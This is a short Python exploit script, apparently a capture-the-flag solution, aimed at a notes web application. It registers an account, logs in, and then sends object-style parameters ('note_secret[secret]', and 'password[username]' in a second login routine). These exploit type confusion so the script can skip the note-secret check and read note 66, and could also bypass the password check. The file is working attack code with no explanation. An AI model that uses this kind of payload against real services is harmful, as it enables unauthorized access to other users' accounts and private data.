import requests
import urllib.parse
from time import sleep
import sys
from requests.adapters import HTTPAdapter, Retry


url = sys.argv[1]
s = requests.Session()
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

def register(username, password):
    resp = s.post(url + '/register', data=urllib.parse.urlencode({
        'username': username,
        'password': password,
    }), headers=headers)
    print('register', resp.text)

def login2(username, password):
    resp = s.post(url + '/login', data=urllib.parse.urlencode({
        'username': username,
        'password[username]': username,
    }), headers=headers)
    print('login2', resp.text)

def login(username, password):
    resp = s.post(url + '/login', data=urllib.parse.urlencode({
        'username': username,
        'password': password,
    }), headers=headers)
    print('login', resp.text)


def view_note(id: str, secret: str):
    resp = s.get(url + '/viewNote', params={
        'note_id': id,
        'note_secret': secret,
    })
    print('view note', resp.text)

def view_note2(id: str, secret: str):
    resp = s.get(url + '/viewNote', params={
        'note_id': id,
        'note_secret[secret]': '1'
    })
    print('view note', resp.text)

def add_note(content, secret):
    resp = s.post(url + '/addNote', data=urllib.parse.urlencode({
        'content': content,
        'note_secret': secret,
    }), headers=headers)
    print('add note', resp.text)

def profile():
    resp = s.get(url + '/profile')
    print('profile', resp.text)

register('xxx', '1234')
login('xxx', '1234')
view_note2(str(66), 'a')